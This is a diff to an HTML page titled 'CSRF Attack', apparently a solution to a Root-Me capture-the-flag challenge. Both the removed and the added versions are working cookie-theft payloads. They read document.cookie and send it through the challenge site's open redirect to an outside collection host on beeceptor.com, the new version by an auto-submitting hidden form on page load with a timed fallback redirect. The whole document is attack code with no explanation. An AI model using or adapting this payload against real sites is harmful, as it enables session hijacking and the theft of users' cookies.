@@ -3,13 +3,18 @@
 <head>
     <title>CSRF Attack</title>
 </head>
-<body>
+<body onload="document.forms[0].submit()">
+    <form action="http://challenge01.root-me.org:58039/redirect" method="GET">
+        <input type="hidden" name="url" value="https://iamevil.free.beeceptor.com/form_cookies?data=COOKIES_HERE">
+    </form>
     <script>
-        // Directly use JavaScript to access document.cookie
-        var cookies = document.cookie;
+        // Try to update the form value with actual cookies
+        document.forms[0].elements[0].value = document.forms[0].elements[0].value.replace('COOKIES_HERE', encodeURIComponent(document.cookie));
         
-        // Immediately redirect with the cookies
-        window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/cookies?data=' + encodeURIComponent(cookies);
+        // Fallback redirect
+        setTimeout(function() {
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/form_timeout';
+        }, 1000);
     </script>
 </body>
 </html>
